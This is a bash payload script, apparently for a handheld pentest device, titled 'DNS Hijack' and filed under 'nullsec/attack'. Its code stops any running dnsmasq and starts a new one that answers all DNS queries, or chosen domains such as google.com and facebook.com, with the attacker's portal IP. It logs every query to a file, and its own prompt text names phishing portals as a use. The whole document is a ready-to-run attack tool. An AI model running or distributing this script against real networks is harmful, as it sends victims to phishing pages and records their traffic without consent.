#!/bin/bash
# Title: DNS Hijack
# Author: bad-antics
# Description: Redirect DNS queries to capture portals
# Category: nullsec/attack

PROMPT "DNS HIJACK

Intercept DNS queries
and redirect to custom
destinations.

Perfect for:
- Phishing portals
- Traffic analysis
- Network pranks

Press OK to continue."

INTERFACE="wlan0"

PROMPT "HIJACK MODE:

1. All traffic → Portal
2. Specific domains
3. Custom redirects

Enter mode next."

HIJACK_MODE=$(NUMBER_PICKER "Mode (1-3):" 1)

PORTAL_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
PORTAL_IP=${PORTAL_IP:-192.168.1.1}

case $HIJACK_MODE in
    1) # All traffic
        DNS_ENTRIES="address=/#/$PORTAL_IP"
        PROMPT "ALL TRAFFIC MODE

Every DNS request will
redirect to portal at:
$PORTAL_IP

Press OK to continue."
        ;;
        
    2) # Specific domains
        PROMPT "DOMAIN HIJACK

Enter domains to hijack
separated by spaces.

Example: google.com
facebook.com twitter.com"
        
        DOMAINS=$(TEXT_PICKER "Domains:" "google.com facebook.com")
        
        DNS_ENTRIES=""
        for DOMAIN in $DOMAINS; do
            DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${PORTAL_IP}\n"
        done
        ;;
        
    3) # Custom redirects
        PROMPT "CUSTOM REDIRECTS

Will ask for each
domain and its target.

Press OK to configure."
        
        DNS_ENTRIES=""
        for i in 1 2 3; do
            DOMAIN=$(TEXT_PICKER "Domain $i:" "")
            if [ -n "$DOMAIN" ]; then
                TARGET=$(TEXT_PICKER "Redirect to IP:" "$PORTAL_IP")
                DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${TARGET}\n"
            fi
        done
        ;;
esac

resp=$(CONFIRMATION_DIALOG "START DNS HIJACK?

This will intercept
DNS traffic.

Ensure you have a
portal running.

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting DNS Hijack..."
SPINNER_START "Hijacking DNS..."

# Stop existing dnsmasq
killall dnsmasq 2>/dev/null

# Create dnsmasq config
cat > /tmp/dnsmasq_hijack.conf << DNSMASQ_EOF
interface=$INTERFACE
no-dhcp-interface=$INTERFACE
bind-interfaces
no-resolv
$(echo -e "$DNS_ENTRIES")
DNSMASQ_EOF

# Configure interface
ifconfig $INTERFACE $PORTAL_IP netmask 255.255.255.0 up

# Start hijacked DNS
dnsmasq -C /tmp/dnsmasq_hijack.conf --log-queries --log-facility=/mmc/nullsec/dns_log.txt &
DNSMASQ_PID=$!

PROMPT "DNS HIJACK ACTIVE!

Portal IP: $PORTAL_IP
Mode: $HIJACK_MODE

Queries logged to:
/mmc/nullsec/dns_log.txt

Press OK to monitor..."

# Monitor loop
DURATION=$(NUMBER_PICKER "Run time (min):" 10)
sleep $((DURATION * 60))

SPINNER_STOP

# Cleanup
kill $DNSMASQ_PID 2>/dev/null
rm /tmp/dnsmasq_hijack.conf 2>/dev/null

QUERY_COUNT=$(wc -l < /mmc/nullsec/dns_log.txt 2>/dev/null || echo 0)

PROMPT "DNS HIJACK STOPPED

Duration: ${DURATION}m
Queries logged: $QUERY_COUNT

Check dns_log.txt
for captured queries.

Press OK to exit."
